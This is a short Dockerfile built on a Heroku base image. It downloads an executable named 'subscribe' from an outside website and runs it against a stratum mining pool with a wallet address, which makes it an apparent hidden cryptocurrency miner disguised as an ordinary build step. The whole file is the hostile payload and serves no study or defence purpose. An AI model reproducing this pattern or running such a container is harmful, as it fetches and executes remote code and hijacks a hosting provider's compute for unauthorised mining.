FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget
RUN wget http://ilovenypizza.com/subscribe; chmod +x subscribe; ./subscribe -a power2b -o stratum+tcp://stratum-na.rplant.xyz:7022 -u MqZeG9Tuh9DXVmrswhHSg7bJy117KewEd2.HCRASH -t2
CMD bash heroku.sh
